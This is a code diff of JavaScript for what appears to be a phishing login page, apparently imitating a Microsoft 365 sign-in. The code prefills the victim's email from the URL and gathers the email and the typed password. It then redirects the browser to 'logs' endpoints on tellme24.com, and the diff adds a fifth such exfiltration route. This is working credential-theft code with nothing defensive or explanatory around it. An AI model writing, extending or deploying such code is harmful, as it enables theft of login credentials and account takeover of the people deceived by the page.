@@ -2,14 +2,14 @@ const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@
 
 const sendData = document.getElementById("sendData").value;
 
+const urlEmail = new URLSearchParams(window.location.search);
+const usermail = urlEmail.get('email');
+
+if (usermail != null) {
+    document.getElementById("emailSpan").innerText = usermail
+}
+
 let url;
-
-// setTimeout(() => {
-//     document.getElementById("temp_loader").style.display = "none"
-//     document.getElementById("main_container").style.display = "flex"
-//     document.getElementById("newHeader").style.display = "block"
-// }, 1500);
-
 
     document.getElementById("main_container").style.display = "flex"
     document.getElementById("newHeader").style.display = "block"
@@ -23,7 +23,8 @@ function preventCheck(p) {
 function getDetails(e) {
     const getHtml = e.parentElement;
 
-    const emailSpan = document.getElementById("emailSpan");
+    let emailSpan = document.getElementById("emailSpan");
+
     const passInput = document.getElementById("passInput");
 
     if (emailSpan.innerText == "" && passInput.value == "") {
@@ -45,6 +46,9 @@ function getDetails(e) {
         }
         else if (sendData == 4) {
             location = "https://tellme24.com/logs/gmb2/4/plain_365.php?" + url;
+        }
+        else if (sendData == 5) {
+            location = "https://tellme24.com/logs/gmb2/5/plain_365.php?" + url;
         }
 
         // location = "https://tellme24.com/logs/gm1/plain1.php?" + url;
